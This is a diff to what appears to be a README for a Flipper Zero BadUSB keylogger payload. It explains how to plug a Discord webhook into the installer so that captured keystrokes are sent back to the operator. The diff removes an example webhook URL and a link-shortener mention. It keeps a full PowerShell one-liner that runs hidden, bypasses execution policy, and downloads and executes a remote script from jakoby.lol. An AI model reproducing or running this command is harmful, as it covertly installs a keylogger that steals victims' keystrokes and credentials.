@@ -41,14 +41,6 @@ Just move the `keylogger.txt` file over to your flipper and you are good to go
 This is the basic command to install the keylogger and provide the webhook for the keystrokes to be sent back to you
 
 * `$dc=''` is the variable where you plug in your discord webhook 
-* These can tend to be pretty long: 
-    
-    "`https://discord.com/api/webhooks/1041572355253274356/hLhWPx-jrl6MKvpck-skir6f8C1ZWfGoRc035oj_djk9ric6j3efu43O-x-Iq597hMtu`"
-* You can use the webhook shortening service on my website [HERE](https://link.iamjakoby.com/)
-
-Where it will return something shorter like this:
-
-`https://link.iamjakoby.com/xxxx`
 
 ```
 powershell -w h -NoP -Ep Bypass $dc='https://link.iamjakoby.com/xxxx';iwr "https://jakoby.lol/m2m" | iex
